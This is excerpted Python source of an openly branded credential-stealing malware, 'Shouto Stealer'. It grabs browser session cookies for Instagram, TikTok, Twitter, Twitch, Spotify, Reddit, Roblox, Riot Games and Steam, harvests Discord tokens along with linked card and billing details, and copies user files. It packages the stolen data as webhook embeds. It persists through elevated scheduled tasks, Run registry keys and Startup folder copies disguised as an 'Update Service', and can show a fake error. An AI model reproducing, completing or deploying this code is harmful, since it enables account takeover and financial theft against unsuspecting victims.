# Shouto Stealer All Rights Recieved
# Coded by Shouto
# https://instagram.com/shoutoreal
...
class Main:
            ...
            if os.path.isdir(ubisoft_path):
                ...
                if found_ubisoft == True:
                    ...
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://instagram.com/shoutoreal\n==============================================\n")
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***Shouto Stealer***",
                    "description": f"***Shouto Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://instagram.com/shoutoreal",
                    "color": 0,
                    "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shouto Stealer***",
                "description": f"***Shouto Instagram Session was detected on the {browser} browser***",
                "url" : "https://instagram.com/shoutoreal",
                "color": 0,
                "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
                "thumbnail": {"url": pp}}
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shouto Stealer***",
                "description": f"***Shouto Tiktok Session was detected on the {browser} browser***",
                "url" : "https://instagram.com/shoutoreal",
                "color": 0,
                "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shouto Stealer***",
                "description": f"***Shouto Twitter Session was detected on the {browser} browser***",
                "url" : "https://instagram.com/shoutoreal",
                "color": 0,
                "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shouto Stealer***",
                "description": f"***Shouto Twitch Session was detected on the {browser} browser***",
                "url" : "https://instagram.com/shoutoreal",
                "color": 0,
                "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
                "thumbnail": {"url": pp}}
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shouto Stealer***",
                "description": f"***Shouto Spotify Session was detected on the {browser} browser***",
                "url" : "https://instagram.com/shoutoreal",
                "color": 0,
                "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Shouto Stealer***",
                "description": f"***Shouto Reddit Session was detected on the {browser} browser***",
                "url" : "https://instagram.com/shoutoreal",
                "color": 0,
                "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
                "thumbnail": {"url": pp}}
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***Shouto Stealer***",
                    "description": f"***Shouto Roblox Session was detected on the {browser} browser***",
                    "url" : "https://instagram.com/shoutoreal",
                    "color": 0,
                    "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
                    "thumbnail": {"url": pp}}
    ...
    def validateDcTokenAndGetInfo(self, value):
        try:
            ...
            for f in self.dcToken:
                ...
                embed = dhooks.Embed(title="***Developer's github account***", description=f"***Shouto Discord Token Detected***", color=0x070707, url="https://github.com/ShoutoEzz", timestamp = "now")
                ...
                if "billing_address" in req2.text:
                    ...
                    embed.add_field(name="💳 Paymen information", inline=True, value = f"```card Type : {dataa['brand']}, Last Four : {dataa['last_4']}, Expiration Date : {dataa['expires_month']}/{dataa['expires_year']}, Cart on name : {dataa['billing_address']['name']}, Adress : {billgininfo}```")
                else:
                    pass
                if req.json()['bio'] != "":
                    embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=True, value=f"```{req.json()['bio']}```")
                embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=True, value=f"```{f}```")
                embed.set_footer(text="https://t.me/Shouto")
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***Shouto Stealer***",
                                    "description": f"***Shouto Steam Session Detected***",
                                    "url" : "https://github.com/ShoutoEzz",
                                    "color": 0,
                                    "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***Shouto Stealer***",
            "description": f"***Shouto Stealer Full Info***",
            "url" : "https://instagram.com/shoutoreal",
            "color": 0,
            "footer": {"text": "https://instagram.com/shoutoreal | https://github.com/ShoutoEzz"},
            "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByShouto")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "ShoutoUpdateService", "Shouto.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("Shouto.exe", "")) # Create Directory
    ...
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "ShoutoService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            ...
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "ShoutoService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "ShoutoService2" /tr "{self.ToPath}"'
                    ...
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        ...
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "ShoutoService" /tr "{self.ToPath}"'
                            ...
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "ShoutoService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
    ...
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shouto Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Shouto Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Shouto.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Shouto.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Shouto.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Shouto.exe"))
        except Exception as e:
            print(str(e))
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "ShoutoService", "Shouto.exe"):
...
if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("Shouto | Stealar | on top |"):
        ...
        print("just Windows Operating system's supported by Shouto")
